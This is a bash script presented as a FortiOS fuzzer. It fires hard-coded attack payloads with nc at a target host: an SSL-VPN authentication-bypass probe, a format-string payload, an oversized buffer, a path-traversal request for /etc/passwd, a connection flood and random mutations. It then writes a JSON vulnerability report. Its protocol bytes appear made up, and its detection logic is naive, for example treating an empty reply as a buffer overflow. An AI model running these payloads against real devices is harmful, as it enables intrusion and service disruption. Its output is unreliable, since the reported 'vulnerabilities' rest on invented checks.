#!/bin/bash
# FortiOS CLI Fuzzer
# Runs directly in FortiOS shell environment
# Execute via SSH: ssh admin@192.168.1.50 < fortios_cli_fuzzer.sh

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;36m'
NC='\033[0m' # No Color

# Configuration
TARGET_HOST="192.168.1.50"
TARGET_PORT="8443"
LOG_FILE="/tmp/fortios_fuzz.log"
REPORT_FILE="/tmp/fortios_fuzz_report.json"

# Functions
print_info() {
    echo -e "${BLUE}[*]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[+]${NC} $1"
}

print_error() {
    echo -e "${RED}[-]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

# FortiOS System Information
show_system_info() {
    echo ""
    print_info "FortiOS System Information"
    echo "=================================="

    # Get system info via diag commands
    echo "Hostname: $(hostname)"
    echo "Version: $(get system status | grep Version)"
    echo "Serial: $(get system status | grep Serial-Number)"
    echo ""
}

# Check if running in FortiOS
check_fortios_environment() {
    print_info "Checking FortiOS environment..."

    if [ -f "/etc/banner" ]; then
        print_success "Running on FortiOS device"
        cat /etc/banner | head -3
    else
        print_warning "May not be running on FortiOS"
    fi

    # Check for FortiOS tools
    if command -v get &> /dev/null; then
        print_success "FortiOS CLI tools available"
    else
        print_error "FortiOS CLI tools not found"
    fi
    echo ""
}

# Test SSL-VPN Authentication
test_auth_bypass() {
    print_info "Testing SSL-VPN Authentication Bypass..."

    # Send auth request without valid password
    {
        printf '\x13\x88\x00\x01admin\x00\x00\x00\x00\x00\x00\x00\x00'
    } | nc -w 2 $TARGET_HOST $TARGET_PORT > /tmp/auth_response.bin 2>&1

    if [ -s /tmp/auth_response.bin ]; then
        if grep -q "authenticated" /tmp/auth_response.bin 2>/dev/null; then
            print_warning "VULNERABLE: Auth bypass possible!"
            echo "CRASH: Auth Bypass" >> $LOG_FILE
            return 0
        fi
    fi

    return 1
}

# Test Format String Vulnerability
test_format_string() {
    print_info "Testing Format String Attack..."

    # Send format string payload to log handler
    {
        printf '\x13\x88\x00\x05'
        printf '\x00\x00\x00\x00\x00\x00\x00\x00'
        printf '[VPN] %x.%x.%x.%p.%p.%p.%p'
    } | nc -w 2 $TARGET_HOST $TARGET_PORT > /tmp/format_response.bin 2>&1

    if grep -q "0x" /tmp/format_response.bin 2>/dev/null; then
        print_warning "VULNERABLE: Format string leak detected!"
        echo "CRASH: Format String" >> $LOG_FILE
        return 0
    fi

    return 1
}

# Test Buffer Overflow
test_buffer_overflow() {
    print_info "Testing Buffer Overflow..."

    # Send oversized payload
    {
        printf '\x13\x88\x00\x09'
        printf '\x00\x00\x00\x00\x00\x00\x00\x00'
        printf 'A%.0s' {1..512}  # Generate 512 A's
    } | nc -w 2 $TARGET_HOST $TARGET_PORT > /tmp/overflow_response.bin 2>&1

    if [ ! -s /tmp/overflow_response.bin ]; then
        print_warning "VULNERABLE: Service crash detected (Buffer Overflow)!"
        echo "CRASH: Buffer Overflow" >> $LOG_FILE
        return 0
    fi

    return 1
}

# Test Path Traversal
test_path_traversal() {
    print_info "Testing Path Traversal..."

    # Try to read /etc/passwd via path traversal
    {
        printf 'GET /api/v2/system/admin/../../../../etc/passwd HTTP/1.1\r\n'
        printf 'Host: %s\r\n' $TARGET_HOST
        printf 'Connection: close\r\n\r\n'
    } | nc -w 2 $TARGET_HOST $TARGET_PORT > /tmp/traversal_response.bin 2>&1

    if grep -q "root:x:" /tmp/traversal_response.bin 2>/dev/null; then
        print_warning "VULNERABLE: Path traversal - /etc/passwd readable!"
        echo "CRASH: Path Traversal" >> $LOG_FILE
        return 0
    fi

    return 1
}

# Test Denial of Service
test_dos() {
    print_info "Testing Denial of Service..."

    # Try connection flood
    local success_count=0

    for i in {1..100}; do
        timeout 1 bash -c "echo 'test' | nc $TARGET_HOST $TARGET_PORT" 2>/dev/null && \
            ((success_count++)) || true
    done

    if [ $success_count -lt 50 ]; then
        print_warning "VULNERABLE: Service became unresponsive (DoS)!"
        echo "CRASH: Denial of Service" >> $LOG_FILE
        return 0
    fi

    return 1
}

# Mutation-based fuzzing
fuzz_mutations() {
    print_info "Starting Mutation-Based Fuzzing..."
    print_info "Mutations: 1000, Iterations: 5"

    local crash_count=0
    local iteration=0

    for endpoint in "auth" "session" "format" "file" "connection"; do
        print_info "Fuzzing endpoint: $endpoint"

        for i in {1..200}; do
            ((iteration++))

            # Generate random mutation
            local mutation_type=$((RANDOM % 5))

            case $mutation_type in
                0) # Bit flip
                    {
                        printf '\x13\x88'
                        printf "$(printf '\\x%02x' $((RANDOM % 256)))"
                        printf "$(printf '\\x%02x' $((RANDOM % 256)))"
                    } | nc -w 1 $TARGET_HOST $TARGET_PORT > /dev/null 2>&1
                    ;;
                1) # Size variation
                    {
                        printf '\x13\x88\x00\x01admin\x00'
                        for j in {1..500}; do printf 'A'; done
                    } | nc -w 1 $TARGET_HOST $TARGET_PORT > /dev/null 2>&1
                    ;;
                2) # Format string
                    {
                        printf '\x13\x88\x00\x05'
                        for j in {1..10}; do printf '%%x'; done
                    } | nc -w 1 $TARGET_HOST $TARGET_PORT > /dev/null 2>&1
                    ;;
                3) # Path traversal
                    {
                        printf 'GET /api/v2/system/admin/'
                        printf '../' | head -c $((RANDOM % 100))
                        printf 'etc/passwd HTTP/1.1\r\n\r\n'
                    } | nc -w 1 $TARGET_HOST $TARGET_PORT > /dev/null 2>&1
                    ;;
                4) # Random payload
                    dd if=/dev/urandom bs=256 count=1 2>/dev/null | \
                        nc -w 1 $TARGET_HOST $TARGET_PORT > /dev/null 2>&1
                    ;;
            esac

            if [ $((i % 50)) -eq 0 ]; then
                print_info "  Progress: $i/200"
            fi
        done
    done

    print_success "Fuzzing campaign complete: $iteration total mutations"
}

# Generate report
generate_report() {
    print_info "Generating Report..."

    local crash_count=$(grep -c "CRASH:" $LOG_FILE 2>/dev/null || echo "0")

    cat > $REPORT_FILE << EOF
{
  "target": "$TARGET_HOST",
  "port": $TARGET_PORT,
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "total_crashes": $crash_count,
  "vulnerabilities": [
EOF

    if grep -q "Auth Bypass" $LOG_FILE 2>/dev/null; then
        echo '    {"type": "Authentication Bypass", "severity": "MEDIUM"},' >> $REPORT_FILE
    fi

    if grep -q "Format String" $LOG_FILE 2>/dev/null; then
        echo '    {"type": "Format String Attack", "severity": "MEDIUM"},' >> $REPORT_FILE
    fi

    if grep -q "Buffer Overflow" $LOG_FILE 2>/dev/null; then
        echo '    {"type": "Buffer Overflow", "severity": "HIGH"},' >> $REPORT_FILE
    fi

    if grep -q "Path Traversal" $LOG_FILE 2>/dev/null; then
        echo '    {"type": "Path Traversal", "severity": "CRITICAL"},' >> $REPORT_FILE
    fi

    if grep -q "Denial of Service" $LOG_FILE 2>/dev/null; then
        echo '    {"type": "Denial of Service", "severity": "MEDIUM"}' >> $REPORT_FILE
    fi

    echo '  ]' >> $REPORT_FILE
    echo '}' >> $REPORT_FILE

    print_success "Report saved to: $REPORT_FILE"
}

# Display report
display_results() {
    echo ""
    echo "========================================"
    echo "FORTIOS FUZZING RESULTS"
    echo "========================================"

    if [ -f $LOG_FILE ]; then
        if grep -q "CRASH:" $LOG_FILE; then
            print_warning "VULNERABILITIES DETECTED!"
            echo ""
            grep "CRASH:" $LOG_FILE | sort | uniq -c
        else
            print_success "No vulnerabilities detected"
        fi
    fi

    echo ""

    if [ -f $REPORT_FILE ]; then
        print_info "Full report:"
        cat $REPORT_FILE
    fi
}

# Main execution
main() {
    echo ""
    print_info "FortiOS CLI Fuzzer v1.0"
    echo "========================================"

    # Initialize
    rm -f $LOG_FILE $REPORT_FILE

    # Check environment
    check_fortios_environment
    show_system_info

    # Run vulnerability tests
    print_info "Running Vulnerability Tests..."
    echo ""

    test_auth_bypass || true
    test_format_string || true
    test_buffer_overflow || true
    test_path_traversal || true
    test_dos || true

    echo ""

    # Run fuzzing campaign
    fuzz_mutations

    echo ""

    # Generate and display report
    generate_report
    display_results

    print_success "Fuzzing campaign completed!"
}

# Execute main
main
